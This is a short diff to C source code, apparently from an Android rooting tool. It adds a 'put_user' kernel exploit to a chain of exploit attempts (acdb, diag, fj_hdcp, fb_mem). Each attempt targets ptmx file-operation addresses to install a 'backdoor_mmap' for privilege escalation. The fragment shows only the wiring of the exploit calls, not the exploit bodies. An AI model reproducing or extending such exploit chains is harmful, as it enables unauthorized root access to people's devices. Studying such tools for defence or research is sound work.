@@ -13,6 +13,7 @@
 #include "libmsm_acdb_exploit/acdb.h"
 #include "libdiagexploit/diag.h"
 #include "libfj_hdcp_exploit/fj_hdcp.h"
+#include "libput_user_exploit/put_user.h"
 #include "libfb_mem_exploit/fb_mem.h"
 #include "backdoor_mmap.h"
 
@@ -325,6 +326,12 @@ run_exploit(void)
 
   printf("Attempt acdb exploit...\n");
   if (acdb_run_exploit(ptmx_fsync_address, (int)&install_mmap,
+                       run_install_mmap, (void *)ptmx_fops_address)) {
+    return true;
+  }
+
+  printf("Attempt put_user exploit...\n");
+  if (put_user_run_exploit(ptmx_fsync_address, (int)&install_mmap,
                        run_install_mmap, (void *)ptmx_fops_address)) {
     return true;
   }
